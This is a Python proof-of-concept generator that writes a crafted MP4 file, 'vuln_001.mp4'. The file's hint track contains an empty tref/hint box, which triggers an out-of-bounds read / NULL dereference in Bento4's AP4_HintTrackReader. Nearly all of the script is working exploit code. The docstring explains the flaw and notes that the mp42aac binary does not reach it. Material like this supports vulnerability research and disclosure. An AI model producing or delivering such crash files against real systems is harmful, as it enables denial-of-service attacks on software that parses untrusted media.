#!/usr/bin/env python3
"""
PoC generator for VULN 001: OOB Read via Empty tref/hint Track ID Array
File: Bento4/Source/C++/Core/Ap4HintTrackReader.cpp, line 66
CWE-125: Out-of-bounds Read

Vulnerability:
    AP4_HintTrackReader::AP4_HintTrackReader() does:
        AP4_Atom* atom = hint_trak_atom->FindChild("tref/hint");
        if (atom != NULL) {
            AP4_UI32 media_track_id =
                AP4_DYNAMIC_CAST(AP4_TrefTypeAtom, atom)->GetTrackIds()[0]; // LINE 66
        }
    When the tref/hint atom has size=8 (header-only, no payload), the
    AP4_TrefTypeAtom is created with an empty m_TrackIds array (m_Items=nullptr).
    Calling operator[](0) on a null m_Items pointer is a NULL dereference / OOB read.

Trigger structure:
    - Audio track  (handler_type='soun'): allows mp42aac to begin processing
    - Hint track   (handler_type='hint'): contains the malicious tref/hint box
      └── tref box
            └── hint sub-box: size=8 (header only), NO track-ID payload

Note:
    The compiled mp42aac binary at build_test/bin/mp42aac does NOT link
    AP4_HintTrackReader (confirmed via nm). Therefore the exact line-66 OOB
    cannot be triggered through mp42aac; the crash path requires a binary that
    calls AP4_HintTrackReader::Create() (e.g., mp4rtphintinfo or mp4info).
    This PoC constructs the correct malicious file structure so that any binary
    exercising AP4_HintTrackReader will crash on it.
"""

import struct
import os

# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def pack_box(fourcc: str, data: bytes = b'') -> bytes:
    """Standard MP4 box: size(4B BE) + fourcc(4B) + payload."""
    assert len(fourcc) == 4
    size = 8 + len(data)
    return struct.pack('>I', size) + fourcc.encode('latin-1') + data


def pack_fullbox(fourcc: str, version: int = 0, flags: int = 0, data: bytes = b'') -> bytes:
    """FullBox: box header + version(1B) + flags(3B) + payload."""
    header = struct.pack('>B', version) + struct.pack('>I', flags)[1:]
    return pack_box(fourcc, header + data)


# ---------------------------------------------------------------------------
# esds (for mp4a): minimal but well-formed AAC-LC 44100Hz 2ch
# ---------------------------------------------------------------------------

# AudioSpecificConfig: audioObjectType=2 (AAC-LC), samplingFreqIdx=4 (44100),
#                      channelConfig=2  → 0001 0 0100 0010 = 0x12 0x10
asc = bytes([0x12, 0x10])

# DecoderSpecificInfo descriptor (tag=5)
dsi = bytes([0x05, len(asc)]) + asc

# DecoderConfigDescriptor body (tag=4)
dcd_body = (
    bytes([0x40]) +               # ObjectTypeIndication = Audio ISO 14496-3
    bytes([0x15]) +               # StreamType = audio (5<<1 | upstream=0 | reserved=1)
    bytes([0x00, 0x00, 0x00]) +   # bufferSizeDB
    struct.pack('>I', 0) +        # maxBitrate
    struct.pack('>I', 0) +        # avgBitrate
    dsi
)
dcd = bytes([0x04, len(dcd_body)]) + dcd_body

# SLConfigDescriptor (tag=6, predefined=2)
slc = bytes([0x06, 0x01, 0x02])

# ES_Descriptor body (tag=3)
es_body = struct.pack('>H', 1) + bytes([0x00]) + dcd + slc  # ES_ID=1, flags=0
esd = bytes([0x03, len(es_body)]) + es_body

# esds FullBox: version=0, flags=0
esds = pack_fullbox('esds', 0, 0, esd)

# ---------------------------------------------------------------------------
# mp4a AudioSampleEntry
# ---------------------------------------------------------------------------
# Layout: reserved(6) + data_ref_idx(2) + reserved(8) + channelcount(2) +
#         samplesize(2) + pre_defined(2) + reserved(2) + samplerate(4) + esds
mp4a_entry = (
    b'\x00' * 6 +                    # reserved (SampleEntry)
    struct.pack('>H', 1) +            # data_reference_index = 1
    b'\x00' * 8 +                     # reserved (AudioSampleEntry)
    struct.pack('>H', 2) +            # channelcount = 2
    struct.pack('>H', 16) +           # samplesize = 16
    struct.pack('>H', 0) +            # pre_defined = 0
    struct.pack('>H', 0) +            # reserved = 0
    struct.pack('>I', 44100 << 16) +  # samplerate = 44100.0 (16.16 fixed-point)
    esds
)
mp4a = pack_box('mp4a', mp4a_entry)

# ---------------------------------------------------------------------------
# stbl (sample table) for audio track — no samples
# ---------------------------------------------------------------------------
stsd_audio = pack_fullbox('stsd', 0, 0, struct.pack('>I', 1) + mp4a)
stts = pack_fullbox('stts', 0, 0, struct.pack('>I', 0))   # entry_count=0
stsc = pack_fullbox('stsc', 0, 0, struct.pack('>I', 0))
stsz = pack_fullbox('stsz', 0, 0, struct.pack('>II', 0, 0))  # sample_size=0, count=0
stco = pack_fullbox('stco', 0, 0, struct.pack('>I', 0))
stbl_audio = pack_box('stbl', stsd_audio + stts + stsc + stsz + stco)

# ---------------------------------------------------------------------------
# dinf / dref / url  (shared helper)
# ---------------------------------------------------------------------------
def make_dinf() -> bytes:
    url  = pack_fullbox('url ', 0, 1, b'')          # flags=1 → self-contained
    dref = pack_fullbox('dref', 0, 0, struct.pack('>I', 1) + url)
    return pack_box('dinf', dref)

# ---------------------------------------------------------------------------
# Audio track (track_id=1)
# ---------------------------------------------------------------------------
tkhd_audio = pack_fullbox('tkhd', 0, 3, (
    struct.pack('>II', 0, 0) +      # creation_time, modification_time
    struct.pack('>I',  1) +          # track_id = 1
    struct.pack('>I',  0) +          # reserved
    struct.pack('>I',  0) +          # duration = 0
    b'\x00' * 8 +                    # reserved
    struct.pack('>hh', 0, 0) +       # layer, alternate_group
    struct.pack('>H', 0x0100) +      # volume = 1.0
    b'\x00' * 2 +                    # reserved
    struct.pack('>9i',               # unity matrix
        0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000) +
    struct.pack('>II', 0, 0)         # width, height
))

mdhd_audio = pack_fullbox('mdhd', 0, 0, (
    struct.pack('>II', 0, 0) +      # creation/modification time
    struct.pack('>I',  44100) +      # timescale
    struct.pack('>I',  0) +          # duration
    struct.pack('>H',  0x55C4) +     # language 'und'
    struct.pack('>H',  0)            # pre_defined
))

hdlr_audio = pack_fullbox('hdlr', 0, 0, (
    struct.pack('>I', 0) +
    b'soun' +                        # handler_type
    b'\x00' * 12 +
    b'SoundHandler\x00'
))

smhd = pack_fullbox('smhd', 0, 0, b'\x00' * 4)   # balance=0, reserved=0

minf_audio = pack_box('minf', smhd + make_dinf() + stbl_audio)
mdia_audio = pack_box('mdia', mdhd_audio + hdlr_audio + minf_audio)
trak_audio  = pack_box('trak', tkhd_audio + mdia_audio)

# ---------------------------------------------------------------------------
# Hint track (track_id=2) — VULNERABILITY TRIGGER
# ---------------------------------------------------------------------------
tkhd_hint = pack_fullbox('tkhd', 0, 3, (
    struct.pack('>II', 0, 0) +
    struct.pack('>I',  2) +          # track_id = 2
    struct.pack('>I',  0) +
    struct.pack('>I',  0) +
    b'\x00' * 8 +
    struct.pack('>hh', 0, 0) +
    struct.pack('>H', 0) +           # volume = 0 (hint)
    b'\x00' * 2 +
    struct.pack('>9i',
        0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000) +
    struct.pack('>II', 0, 0)
))

# KEY: tref box containing hint sub-box with size=8 (ONLY header, no payload)
# When AP4_TrefTypeAtom is parsed with size=8:
#   data_size = 8 - 8 = 0  →  while(data_size >= 4) never runs
#   m_TrackIds remains empty (m_Items = nullptr)
# Then line 66: GetTrackIds()[0]  →  nullptr[0]  →  NULL dereference / OOB read
hint_inner = struct.pack('>I', 8) + b'hint'  # 8-byte box, zero track IDs
tref = pack_box('tref', hint_inner)

mdhd_hint = pack_fullbox('mdhd', 0, 0, (
    struct.pack('>II', 0, 0) +
    struct.pack('>I',  90000) +      # timescale
    struct.pack('>I',  0) +
    struct.pack('>H',  0x55C4) +
    struct.pack('>H',  0)
))

hdlr_hint = pack_fullbox('hdlr', 0, 0, (
    struct.pack('>I', 0) +
    b'hint' +                        # handler_type = hint
    b'\x00' * 12 +
    b'HintHandler\x00'
))

# hmhd (hint media header)
hmhd = pack_fullbox('hmhd', 0, 0, b'\x00' * 8)

stsd_hint = pack_fullbox('stsd', 0, 0, struct.pack('>I', 0))   # no entries
stts_h = pack_fullbox('stts', 0, 0, struct.pack('>I', 0))
stsc_h = pack_fullbox('stsc', 0, 0, struct.pack('>I', 0))
stsz_h = pack_fullbox('stsz', 0, 0, struct.pack('>II', 0, 0))
stco_h = pack_fullbox('stco', 0, 0, struct.pack('>I', 0))
stbl_hint = pack_box('stbl', stsd_hint + stts_h + stsc_h + stsz_h + stco_h)

minf_hint = pack_box('minf', hmhd + make_dinf() + stbl_hint)
mdia_hint  = pack_box('mdia', mdhd_hint + hdlr_hint + minf_hint)
trak_hint  = pack_box('trak', tkhd_hint + tref + mdia_hint)

# ---------------------------------------------------------------------------
# mvhd (movie header)
# ---------------------------------------------------------------------------
mvhd = pack_fullbox('mvhd', 0, 0, (
    struct.pack('>II', 0, 0) +       # creation/modification time
    struct.pack('>I',  1000) +        # timescale
    struct.pack('>I',  0) +           # duration
    struct.pack('>i',  0x00010000) +  # rate = 1.0
    struct.pack('>H',  0x0100) +      # volume = 1.0
    b'\x00' * 10 +                    # reserved
    struct.pack('>9i',
        0x00010000, 0, 0, 0, 0x00010000, 0, 0, 0, 0x40000000) +
    b'\x00' * 24 +                    # pre_defined
    struct.pack('>I',  3)             # next_track_id = 3
))

# ---------------------------------------------------------------------------
# ftyp
# ---------------------------------------------------------------------------
ftyp = pack_box('ftyp',
    b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom'
)

# ---------------------------------------------------------------------------
# Assemble and write
# ---------------------------------------------------------------------------
moov = pack_box('moov', mvhd + trak_audio + trak_hint)
payload = ftyp + moov

out_dir  = os.path.dirname(os.path.abspath(__file__))
out_path = os.path.join(out_dir, 'vuln_001.mp4')

with open(out_path, 'wb') as f:
    f.write(payload)

print(f"[+] Written {out_path} ({len(payload)} bytes)")
print(f"    ftyp:          {len(ftyp)} bytes")
print(f"    moov:          {len(moov)} bytes")
print(f"      mvhd:        {len(mvhd)} bytes")
print(f"      trak(audio): {len(trak_audio)} bytes")
print(f"      trak(hint):  {len(trak_hint)} bytes")
print(f"    hint tref sub-box size field = 8 (empty payload → empty m_TrackIds)")
